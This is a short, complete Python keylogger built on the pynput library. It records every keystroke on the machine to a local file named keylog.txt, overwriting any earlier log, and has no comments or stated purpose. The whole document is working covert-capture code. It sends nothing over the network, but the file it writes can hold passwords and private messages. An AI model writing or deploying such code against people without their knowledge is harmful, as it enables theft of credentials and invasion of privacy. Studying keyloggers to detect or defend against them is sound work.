from pynput.keyboard import Listener
from pynput.keyboard import Key
import logging
import os

path = "keylog.txt"
if os.path.exists(path):
    os.remove(path)
logging.basicConfig(handlers=[logging.FileHandler('keylog.txt', 'w', 'utf-8')], level=logging.DEBUG, format='%(message)s')
logging.StreamHandler.terminator = " "

def on_press(key):
    key = str(key)
    if (key.startswith("Key.")): key = key[4:]
    else: key = key.strip('\'')
    logging.info(key)
    
with Listener(on_press=on_press) as listener:
    logging.info("\n")
    listener.join()